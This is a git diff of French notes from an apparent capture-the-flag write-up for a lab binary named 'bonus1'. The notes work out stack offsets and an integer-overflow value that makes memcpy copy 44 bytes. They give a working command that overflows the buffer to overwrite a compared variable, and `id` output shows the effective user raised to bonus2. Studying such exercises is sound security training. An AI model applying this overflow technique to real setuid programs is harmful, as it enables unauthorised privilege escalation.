@@ -48,11 +48,21 @@
    0x080484a3 <+127>:	leave  
    0x080484a4 <+128>:	ret
 
+Le nombre qu'on envoie dans memcpy est à l'adresse 0x14(esp)
+Celui qui est comparé avec 0x574f4c46 est dans 0x3c(esp)
 
-2147483648(int max) − 44 = 2147483604
+0x3c - 0x14 = 0x28 = 40
+
+offset 40, + 4octets pour écraser la variable
+
+2147483648(int max) − 44 = 2147483604 (on veut overflow int min pour arriver à 44 car on ne peut pas mettre de nombre plus grand que 9)
 −2147483648(int min) − 2147483604 = −4294967252
-−4294967252 ÷ 4 = −1073741813
+−4294967252 ÷ 4 = −1073741813 (on divise par 4 le résultat car il sera mutliplié par 4 dans le memcpy)
 
-offset 44, - 4octets pour l'adresse
+puis en 2eme argumenent on envoie 40 octets
 
-./bonus1 "-1073741813" "$(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')"
+>./bonus1 "-1073741813" "$(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')"
+
+>id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+
